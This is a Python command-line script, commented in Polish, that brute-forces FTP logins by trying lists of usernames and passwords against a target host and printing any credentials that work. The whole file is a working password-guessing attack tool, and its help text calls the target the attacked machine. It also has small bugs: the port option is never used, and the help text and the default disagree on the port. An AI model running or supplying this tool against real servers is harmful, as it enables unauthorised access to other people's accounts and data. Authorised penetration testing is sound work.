import ftplib
import os.path


def ftp_brute_force(target_host: str = None, users='', passwords='', target_port: int = 21):
    assert isinstance(target_host, str), "Nie określiłeś hosta docelowego!"
    result = {
        'target_host': target_host,
        'result': False,
        'credentials': []
    }
    # users -> lista w postaci [], plik, pojedyncza nazwa użytkownika
    if isinstance(users, list):
        # przekazano listę użytkowników
        pass
    elif isinstance(users, str):
        if users == '':
            # nie określono użytkoników -> tutaj musi być jakiś default
            users = ['root']
        else:
            # to może być wskazanie na plik, lub to może być pojedynczy użytkownik
            if os.path.isfile(users):
                # wskazano plik z użytkownikami
                with open(users, errors='ignore') as f:
                    users = f.readlines()
            elif len(users) > 0:
                users = [users]
    if isinstance(passwords, list):
        # przekazano listę haseł
        pass
    elif isinstance(passwords, str):
        if passwords == '':
            # nie określono haseł -> tutaj musi być jakiś default
            passwords = ['password']
        else:
            # to może być wskazanie na plik, lub to może być pojedyncze hasło
            if os.path.isfile(passwords):
                # wskazano plik z hasłami
                with open(passwords, errors='ignore') as f:
                    passwords = f.readlines()
                pass
            elif len(passwords) > 0:
                passwords = [passwords]
    ftp = ftplib.FTP()
    for user in users:
        user = user.replace("\n", "")
        for password in passwords:
            password = password.replace("\n", "")
            try:
                ftp.connect(target_host)
                ftp.login(user, password)
                result['credentials'].append({'user': user, 'password': password})
                if __name__ == "__main__":
                    print(f"[+] Określono dane dostępowe:\n\tHost: {target_host}\n\tUżytkownik: {user}\n\tHasło: {password}")
            except ftplib.error_perm as e:
                if __name__ == '__main__' and str(e) == '530 Login incorrect.':
                    print(f"[!] Błędne dane logowania {user}:{password}")
            except OSError as e:
                if str(e) == '[Errno 101] Network is unreachable':
                    print(f"[!] Host: {target_host} jest nieosiągalny!")
                    exit(1)
            except ftplib.all_errors as e:
                print(e)
    if len(result['credentials']) > 0:
        result['result'] = True
    return result


if __name__ == "__main__":
    import argparse

    descr = "Prosty skrypt do próby złamania hasła dla usługi FTP."
    parser = argparse.ArgumentParser(description=descr)
    parser.add_argument("--host", help="Nazwa hosta albo adres IP atakowanej maszyny.", required=True)
    parser.add_argument("--port", help="Port SSH (domyślnie 21)")
    parser.add_argument("--user", help="Nazwa użytkownika lub plik z listą użytkowników (domyślnie root)", required=True)
    parser.add_argument("--password", help="Hasło do sprawdzenia lub plik z listą haseł.", required=True)

    # parsowanie przekazanych argumentów
    args = parser.parse_args()
    if args.host:
        target_host = args.host
    if args.port:
        target_host_port = args.port
    else:
        target_host_port = 22
    if args.user:
        users = args.user
    else:
        users = ''
    if args.password:
        passwords = args.password
    else:
        passwords = ''
    ftp_brute_force(target_host=target_host, target_port=target_host_port, passwords=passwords, users=users)
